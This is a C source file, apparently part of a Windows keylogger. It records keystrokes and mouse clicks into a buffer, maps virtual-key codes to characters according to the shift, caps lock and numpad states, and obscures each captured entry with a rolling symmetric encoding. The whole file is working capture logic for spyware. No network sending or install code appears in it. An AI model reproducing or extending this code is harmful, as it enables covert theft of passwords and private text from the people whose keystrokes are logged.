
#include "keylogger.h"


// private method prototypes
static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode);
static RET_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s);
static void createKeyPairs(KEY_LOGGER* kLogger);


/**
 * Initialises a new KEY_LOGGER struct including the key code to 
 * charatcer mappings
 * 
 * @return the newly allocated key loggers address
 */
KEY_LOGGER* initKeyLogger() {
    KEY_LOGGER* kLogger = malloc(sizeof(KEY_LOGGER));
    if (kLogger == NULL) { return NULL; }

    // set all the key pairs to NULL
    for (int i = 0; i < NUM_KEYS; i++) {
        kLogger->keyCodes[i] = NULL;
    }

    kLogger->shift = FALSE;
    kLogger->capsLock = FALSE;
    kLogger->numPad = FALSE;

    kLogger->keyBuffer[0] = '\0';
    kLogger->bufferPtr = 0;  // set the buffer pointer to the start

    kLogger->encKey = '\0';  // init symmetric encoding key
    
    createKeyPairs(kLogger);
    return kLogger;
}

/**
 * simply go through and cleanup each key pair struct before freeing
 * the keylogger itself.
 * 
 * @param kLogger the key logger to free
 */
void keyLoggerCleanup(KEY_LOGGER* kLogger) {
    for (int i = 0; i < NUM_KEYS; i++) {
        cleanupKeyPair(kLogger->keyCodes[i]); // free key pair structs
    }
    free(kLogger);
}

/**
 * Update the state of the boolean keys flags. If shift is down then set it to true, 
 * otherwise set to false. If caps lock or numpad has been pressed then simply 
 * swap the flags!
 * 
 * @param kLogger the key logger whose state we are updating
 * @param wParam value that specifies the keys state
 * @param vkCode the code of the key pressed
 * @return whether the loggers "state" was updated or not
 */
BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode) {
    // shift has been pressed so update it
    if (*vkCode == VK_SHIFT || *vkCode == VK_LSHIFT || *vkCode == VK_RSHIFT) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            kLogger->shift = TRUE;  // if its key-down shift state it true
        } else {
            kLogger->shift = FALSE; // on release set to false
        }
        return TRUE;
    }
    // if its not key down we don't need to check, we now only 
    // care for key down capslock and numlock
    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
        return FALSE;
    }
    
    if (*vkCode == VK_CAPITAL) {
        swapBOOL(&kLogger->capsLock);
        return TRUE;
    }
    if (*vkCode == VK_NUMLOCK) {
        swapBOOL(&kLogger->numPad);
        return TRUE;
    }
    return FALSE;
}

/**
 * Retrieve the necassary string associated with the key press and
 * write it to the key loggers buffer
 * 
 * @param kLogger the key logger
 * @param vkCode code of the key pressed
 * @return whether the operation was successful
 */
RET_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
    KEY_PAIR* kp = kLogger->keyCodes[*vkCode];
    if (kp == NULL) { return R_NULL; }
    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) { return R_FULL_BUFF; }

    int encStart = kLogger->bufferPtr;  // number of bytes from the keyBuffer base pointer
    char* encodeStrPtr = kLogger->keyBuffer + encStart;
    
    if (isKeyUnprintable(kp)) {
        // write unprintable string to buffer
        RET_CODE ret = writeStrToBuffer(kLogger, kp->unprintableKeyStr);
        // we only want to encode the content that has been added!
        encode(encodeStrPtr, &kLogger->encKey);
        return ret;
    }
    
    // otherwise simply retrieve the char pressed and return
    char ch = getKeyChar(kLogger, kp, vkCode);
    kLogger->keyBuffer[kLogger->bufferPtr++] = ch;
    kLogger->keyBuffer[kLogger->bufferPtr] = '\0';
    encode(encodeStrPtr, &kLogger->encKey); // this will only encode the single char

    return R_SUCCESS;
}

/**
 * Given the code of the key, first check if its a letter and whether the shift 
 * or capslock flags are set, we check this first as they are the most common keys
 * and this provides a tiny optimisation. Otherwise, check the special cases:
 *  1. if shift flag is set
 *  2. if numPad is active and VK_NUMPAD0 <= vkCode <= VK_NUMPAD9
 * 
 * @param kLogger the curretn key logger
 * @param kp the key pair struct associated with the key press
 * @param vkCode the code of the key press
 * @return the character of the key that was pressed
 */
static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode) {
    if (*vkCode >= A && *vkCode <= Z) {
        if (kLogger->capsLock || kLogger->shift) { 
            return kp->onShift;
        }
        return kp->normal;
    }

    if (kLogger->shift) {
        return kp->onShift; // special case 1
    } else if (kLogger->numPad && (*vkCode >= VK_NUMPAD0 && *vkCode <= VK_NUMPAD9)) {
        return kp->normal;  // sepcial case 2
    }  else {
        return kp->normal; 
    }
}

/**
 * Manually writes the characters from the string represenation of an
 * unprintable key into the key buffer, returing the appropriate code
 * 
 * @param kLogger the key logger to write to
 * @param s the string to write to the buffer
 * @return whether it was a successful write
 */
static RET_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
    // write each char of s into the buffer
    char* str = s;
    while (*str != '\0' && kLogger->bufferPtr < MAX_BUFF_LEN - 1) {
        kLogger->keyBuffer[kLogger->bufferPtr++] = *str++;
    }
    kLogger->keyBuffer[kLogger->bufferPtr] = '\0';

    // if we have hit the end of the buffer return full buff error!
    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) { return R_FULL_BUFF; }
    return R_SUCCESS;
}

/**
 * Set the buffer pointer to the start, and set the first character to a null
 * terminator. Also reset the key loggers encoding key to the base key
 * 
 * @param kLogger
 * @param key the char to set the encoding key to
 */
void resetKLBufferAndKey(KEY_LOGGER* kLogger, char key) {
    memset(kLogger->keyBuffer, '\0', MAX_BUFF_LEN);
    kLogger->bufferPtr = 0;
    kLogger->encKey = key;
}

/**
 * initialise all of the key pairs associated with the vkCodes that we need to log!
 * https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 * 
 * @param kLogger the key logger whose key pairs we are initialising
 */
static void createKeyPairs(KEY_LOGGER* kLogger) {
    // initialise numpad values
    const char digits[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
    for (int i = 0; i <= 9; i++) {
        kLogger->keyCodes[i + VK_NUMPAD0] = initKeyPair(digits[i], '\0', NULL);
    }
    
    // initialise letter array
    for (int upperLetter = A; upperLetter <= Z; upperLetter++) {
        char lowerLetter = upperLetter + 0x20; // get lowercase
        kLogger->keyCodes[upperLetter] = initKeyPair(lowerLetter, upperLetter, NULL);
    }
    
    kLogger->keyCodes[VK_LBUTTON]  = initKeyPair('\0', '\0', "[LMOUSE]");
    kLogger->keyCodes[VK_RBUTTON]  = initKeyPair('\0', '\0', "[RMOUSE]");
    kLogger->keyCodes[VK_BACK]     = initKeyPair('\0', '\0', "[BACKSPACE]");
    kLogger->keyCodes[VK_TAB]      = initKeyPair('\0', '\0', "[TAB]");
    kLogger->keyCodes[VK_RETURN]   = initKeyPair('\0', '\0', "[ENTER]");
    kLogger->keyCodes[VK_CONTROL]  = initKeyPair('\0', '\0', "[CTRL]");
    kLogger->keyCodes[VK_LCONTROL] = kLogger->keyCodes[VK_CONTROL];
    kLogger->keyCodes[VK_RCONTROL] = kLogger->keyCodes[VK_CONTROL];
    kLogger->keyCodes[VK_MENU]     = initKeyPair('\0', '\0', "[ALT]");
    kLogger->keyCodes[VK_ESCAPE]   = initKeyPair('\0', '\0', "[ESC]");
    kLogger->keyCodes[VK_SPACE]    = initKeyPair('\0', '\0', " ");
    kLogger->keyCodes[VK_PRIOR]    = initKeyPair('\0', '\0', "[PGUP]");
    kLogger->keyCodes[VK_NEXT]     = initKeyPair('\0', '\0', "[PGDWN]");
    kLogger->keyCodes[VK_HOME]     = initKeyPair('\0', '\0', "[HOME]");
    kLogger->keyCodes[VK_LEFT]     = initKeyPair('\0', '\0', "[LEFT]");
    kLogger->keyCodes[VK_UP]       = initKeyPair('\0', '\0', "[UP]");
    kLogger->keyCodes[VK_RIGHT]    = initKeyPair('\0', '\0', "[RIGHT]");
    kLogger->keyCodes[VK_DOWN]     = initKeyPair('\0', '\0', "[DOWN]");
    kLogger->keyCodes[VK_SNAPSHOT] = initKeyPair('\0', '\0', "[PRSCREEN]");
    kLogger->keyCodes[VK_INSERT]   = initKeyPair('\0', '\0', "[INSERT]");
    kLogger->keyCodes[VK_DELETE]   = initKeyPair('\0', '\0', "[DELETE]");
    kLogger->keyCodes[VK_SLEEP]    = initKeyPair('\0', '\0', "[SLEEP]");

    kLogger->keyCodes[0x30] = initKeyPair(digits[0], ')', NULL);
    kLogger->keyCodes[0x31] = initKeyPair(digits[1], '!', NULL);
    kLogger->keyCodes[0x32] = initKeyPair(digits[2], '@', NULL);
    kLogger->keyCodes[0x33] = initKeyPair(digits[3], '#', NULL);
    kLogger->keyCodes[0x34] = initKeyPair(digits[4], '$', NULL);
    kLogger->keyCodes[0x35] = initKeyPair(digits[5], '%', NULL);
    kLogger->keyCodes[0x36] = initKeyPair(digits[6], '^', NULL);
    kLogger->keyCodes[0x37] = initKeyPair(digits[7], '&', NULL);
    kLogger->keyCodes[0x38] = initKeyPair(digits[8], '*', NULL);
    kLogger->keyCodes[0x39] = initKeyPair(digits[9], '(', NULL);

    kLogger->keyCodes[VK_OEM_PLUS]   = initKeyPair('=', '+', NULL);
    kLogger->keyCodes[VK_OEM_COMMA]  = initKeyPair(',', '<', NULL);
    kLogger->keyCodes[VK_OEM_MINUS]  = initKeyPair('-', '_', NULL);
    kLogger->keyCodes[VK_OEM_PERIOD] = initKeyPair('.', '>', NULL);
    kLogger->keyCodes[VK_OEM_1]      = initKeyPair(';', ':', NULL);
    kLogger->keyCodes[VK_OEM_2]      = initKeyPair('/', '?', NULL);
    kLogger->keyCodes[VK_OEM_3]      = initKeyPair('`', '~', NULL);
    kLogger->keyCodes[VK_OEM_4]      = initKeyPair('[', '{', NULL);
    kLogger->keyCodes[VK_OEM_5]      = initKeyPair('\\', '|', NULL);
    kLogger->keyCodes[VK_OEM_6]      = initKeyPair(']', '}', NULL);
    kLogger->keyCodes[VK_OEM_7]      = initKeyPair('\'', '"', NULL);   
}
